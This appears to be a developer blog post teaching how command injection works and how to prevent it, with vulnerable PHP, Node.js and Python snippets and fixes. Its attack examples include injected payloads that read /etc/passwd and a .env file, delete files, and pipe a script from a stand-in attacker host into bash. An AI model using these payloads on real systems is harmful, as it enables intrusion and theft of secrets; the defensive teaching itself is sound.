---
title: "Command Injection: When Your App Becomes a Hacker's Personal Shell 💀"
date: "2026-03-14"
excerpt: "You called exec() to run a quick ping. The attacker called it to run rm -rf /. Command injection turns your server into an open terminal — here's exactly how it happens and how to stop it."
tags: ["\"cybersecurity\"", "\"web-security\"", "\"security\"", "\"command-injection\"", "\"owasp\""]
featured: "true"
---

# Command Injection: When Your App Becomes a Hacker's Personal Shell 💀

You needed to ping a host. Simple enough. So you grabbed the user's input and passed it to `exec()`. Ten lines of code, feature done, ship it.

Somewhere out there, an attacker typed `; cat /etc/passwd` into your little ping field and got your entire user database.

Welcome to command injection — the vulnerability where your app hands the OS to whoever's on the other end of the browser.

## What Is Command Injection? 🎯

Command injection happens when user-controlled input is passed directly to a system shell command without sanitization. The shell sees it as legitimate commands and executes them with whatever permissions your app process has.

SQL injection is bad. Command injection is worse — instead of owning your database, the attacker owns your **entire server**.

Here's the classic PHP offender that still shows up in production codebases in 2026:

```php
// 🚨 DANGEROUS — Never do this
$host = $_GET['host'];
$output = shell_exec("ping -c 4 $host");
echo $output;
```

Normal user types: `google.com`
Shell runs: `ping -c 4 google.com` ✅

Attacker types: `google.com; cat /etc/passwd`
Shell runs: `ping -c 4 google.com; cat /etc/passwd` 💀

The semicolon ends the ping command. Everything after it runs as a fresh command. The attacker just read your system's user list. But they won't stop there.

```
# What an attacker actually tries:
google.com; id
google.com; whoami
google.com; ls -la /var/www
google.com; cat /var/www/html/.env
google.com; curl http://attacker.com/shell.sh | bash
```

That last one? That's a reverse shell. Your server is now dialing home to the attacker's machine. Game over.

## The Node.js Version (Same Problem, Different Syntax) 🟢

Node developers aren't immune. The `child_process` module is perfectly safe — until you use it wrong:

```javascript
// 🚨 DANGEROUS
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  exec(`ping -c 4 ${host}`, (error, stdout) => {
    res.send(stdout);
  });
});
```

Attacker sends: `/ping?host=google.com%3B%20rm%20-rf%20%2Ftmp%2F*`
(URL decoded: `google.com; rm -rf /tmp/*`)

Your tmp directory is now empty. Depending on what lives there, this could crash your app or worse.

## The Sneaky Injection Operators 🔧

Attackers have more tricks than just semicolons. All of these work in bash:

```bash
; command        # Run command after, regardless of success
&& command       # Run command after if ping succeeds
|| command       # Run command after if ping fails
| command        # Pipe output to command
`command`        # Command substitution
$(command)       # Command substitution (modern)
\n command       # Newline — some filters miss this
```

So even if you filter semicolons, the attacker tries `&&`, `||`, backticks, `$()`, and newlines. Blacklisting shell metacharacters is a losing game.

## The Right Fix: Stop Using the Shell 🛡️

The cleanest solution is to **never pass user input to a shell at all**. Use language-level functions that invoke programs directly without invoking a shell interpreter:

```javascript
// ✅ SAFE — execFile doesn't invoke a shell
const { execFile } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;

  // Validate first — only allow valid hostnames/IPs
  const hostRegex = /^[a-zA-Z0-9._-]+$/;
  if (!hostRegex.test(host)) {
    return res.status(400).json({ error: 'Invalid host' });
  }

  // execFile passes arguments as an array — no shell involved
  execFile('ping', ['-c', '4', host], (error, stdout) => {
    if (error) return res.status(500).json({ error: 'Ping failed' });
    res.send(stdout);
  });
});
```

`execFile` passes arguments directly to the program. There's no shell to interpret `;`, `&&`, or backticks. The argument is just a string passed to `ping` — harmless.

The equivalent in PHP:

```php
// ✅ SAFE — escapeshellarg wraps input in single quotes and escapes internal quotes
$host = $_GET['host'];

// Still validate — don't rely solely on escaping
if (!preg_match('/^[a-zA-Z0-9._-]+$/', $host)) {
    http_response_code(400);
    echo 'Invalid host';
    exit;
}

// escapeshellarg neutralizes shell metacharacters
$safe_host = escapeshellarg($host);
$output = shell_exec("ping -c 4 $safe_host");
echo htmlspecialchars($output);
```

`escapeshellarg()` wraps the argument in single quotes and escapes any single quotes inside. The shell receives it as a literal string — not a command. But I still validate first, because defense in depth.

## Real-World Attack Scenarios 🌍

Command injection shows up in more places than just ping utilities:

**Image processing:**
```php
// Converting uploaded images — common in file upload features
exec("convert $filename output.png"); // 🚨 dangerous if filename is user-controlled
```

**Log analysis tools:**
```python
# Internal admin tool — "surely only admins use this"
import subprocess
log_file = request.args.get('file')
output = subprocess.check_output(f"grep ERROR {log_file}", shell=True)  # 🚨
```

**Export features:**
```javascript
// PDF generation
exec(`wkhtmltopdf ${url} output.pdf`);  // 🚨 if url is user input
```

The pattern is always the same: developer needs to run a system utility, takes the easy path, and user input ends up in the command string.

## Damage Control: Principle of Least Privilege ⚡

Even if you slip up, you can limit the blast radius. Run your app as a user with minimal permissions:

```bash
# Don't run your app as root — create a dedicated user
useradd -r -s /bin/false appuser
chown -R appuser:appuser /var/www/myapp

# In Docker — add this to your Dockerfile
USER appuser
```

If your app runs as `www-data` with no sudo access, `rm -rf /` becomes `rm -rf /var/www/html` (still bad) rather than nuking the entire system.

Also, **disable functions you don't need** in PHP:

```ini
; php.ini — disable dangerous functions if you don't need them
disable_functions = exec, passthru, shell_exec, system, proc_open, popen
```

## The Audit Checklist 📋

When reviewing code for command injection, search for these:

- `exec()`, `shell_exec()`, `system()`, `passthru()`, `popen()` in PHP
- `child_process.exec()` with string interpolation in Node.js
- `os.system()`, `subprocess.run(shell=True)` in Python
- Any function that accepts user input and calls an OS command

The key question for every instance: **does any part of this command string come from user input, even indirectly?** If yes, it's a candidate for injection.

## TL;DR ⚡

1. **Never** pass user input directly into shell commands
2. Use `execFile` / array-based subprocess calls to avoid invoking a shell
3. Validate and whitelist input with strict regexes before using it anywhere near a command
4. If you must use shell commands, escape with `escapeshellarg()`/`shlex.quote()`
5. Run your app process with minimal OS permissions

Command injection is preventable 100% of the time. Unlike some vulnerability classes where "it depends," there's always a way to avoid passing unsanitized input to the shell. It just requires not taking the lazy shortcut.

The lazy shortcut is very tempting. The attacker is counting on it.

---

**Enjoyed this?** Connect with me on [LinkedIn](https://www.linkedin.com/in/anuraghkp) — always happy to geek out over security with other developers.

**GitHub:** [github.com/kpanuragh](https://github.com/kpanuragh) — security tooling and research notes live there too.

*Validate your inputs. Never trust the shell.* 🔐
